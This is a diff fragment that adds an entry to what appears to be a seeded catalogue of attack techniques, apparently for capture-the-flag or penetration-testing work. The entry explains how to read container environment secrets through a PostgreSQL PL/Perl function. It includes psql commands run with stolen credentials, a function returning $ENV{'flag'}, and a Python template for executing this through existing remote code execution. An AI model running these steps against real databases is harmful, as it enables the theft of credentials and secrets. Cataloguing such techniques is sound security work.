+                "A PostgreSQL database has the `plperl` or `plperlu` (PL/Perl Untrusted) language extension "
+                "installed, and the connected database user has CREATE permission on at least one schema. "
+                "Secrets such as flags or API keys are stored as environment variables on the database container "
+                "(e.g., set via Docker ENV directive). The attacker has obtained database credentials (e.g., from "
+                "a .env file read via prior RCE) and can execute DDL statements. PL/Perl functions can access "
+                "the `$ENV{}` hash to read process environment variables, allowing exfiltration of secrets that "
+                "are not stored in any database table."
+            ),
+            "prerequisites": [
+                "plperl or plperlu extension installed in PostgreSQL",
+                "Database user has CREATE privilege on a schema",
+                "Secrets stored as environment variables on the DB container",
+                "Attacker has DB credentials (from .env file read, SQLi extraction, etc.)",
+                "Network access to PostgreSQL port from compromised service or directly",
+            ],
+            "technique_steps_md": (
+                "1. Obtain DB credentials (e.g., via RCE → read .env → DATABASE_URL)\\n"
+                "2. Connect to PostgreSQL using the extracted credentials\\n"
+                "   `PGPASSWORD=<pass> psql -h db -U db_user -d resume_db`\\n"
+                "3. Create a schema owned by the connected user (if needed):\\n"
+                "   `CREATE SCHEMA IF NOT EXISTS db_user AUTHORIZATION db_user;`\\n"
+                "4. Create a PL/Perl function that reads environment variables:\\n"
+                "   ```\\n"
+                "   CREATE OR REPLACE FUNCTION db_user.get_flag()\\n"
+                "   RETURNS text AS $$\\n"
+                "       return $ENV{'flag'};\\n"
+                "   $$ LANGUAGE plperl;\\n"
+                "   ```\\n"
+                "5. Execute the function to retrieve the secret:\\n"
+                "   `SELECT db_user.get_flag();`"
+            ),
+            "code_template": (
+                "import subprocess\\n"
+                "# Via RCE on the API server, connect to DB and read flag\\n"
+                "cmd = (\\n"
+                "    'PGPASSWORD=<db_password> psql -h db -U db_user -d resume_db -c \"'\\n"
+                "    'CREATE SCHEMA IF NOT EXISTS db_user AUTHORIZATION db_user; '\\n"
+                "    'CREATE OR REPLACE FUNCTION db_user.get_flag() '\\n"
+                "    'RETURNS text AS \\$\\$return \\\\\\$ENV{\\\"flag\\\"}; \\$\\$ LANGUAGE plperl; '\\n"
+                "    'SELECT db_user.get_flag();\"'\\n"
+                ")\\n"
+                "# Execute via prior RCE (child_process.execSync)"
+            ),
+            "examples": [{
+                "params": {
+                    "db_engine": "PostgreSQL 15.8 (custom build from source)",
+                    "extensions": "plperl (trusted) + plperlu (untrusted) — both installed",
+                    "env_var": "flag (set via Docker ENV directive in db Dockerfile)",
+                    "user_privilege": "db_user with GRANT ALL on public schema + CREATE on database",
+                    "access_method": "Via RCE on API server → psql to internal db host",
+                },
+                "notes": (
+                    "The distinction between plperl (trusted) and plperlu (untrusted) is important: standard "
+                    "PostgreSQL plperl restricts access to $ENV{} and other dangerous Perl features, while "
+                    "plperlu allows unrestricted Perl execution including file I/O and environment access. "
+                    "However, custom PostgreSQL builds may have relaxed these restrictions. The key insight is "
+                    "that secrets stored as container environment variables can be read by any language extension "
+                    "that has access to the process environment, even if the secrets are not in any database table."
+                ),
+            }],
+            "tags": ["information-disclosure", "postgresql", "plperl", "plperlu", "env-var",
+                     "environment-variable", "docker", "privilege-escalation", "language-extension"],
+        },
+    },
 ]
 
 
@@ -1784,5 +2982,5 @@ class Command(BaseCommand):
                 self.stdout.write(self.style.WARNING("Embedding generation failed — skipping"))
         else:
             self.stdout.write(self.style.WARNING(
-                "Voyage embedding disabled: VOYAGE_API_KEY not set — semantic search returns empty results"
+                "Embedding model not available — semantic search will be disabled"
             ))
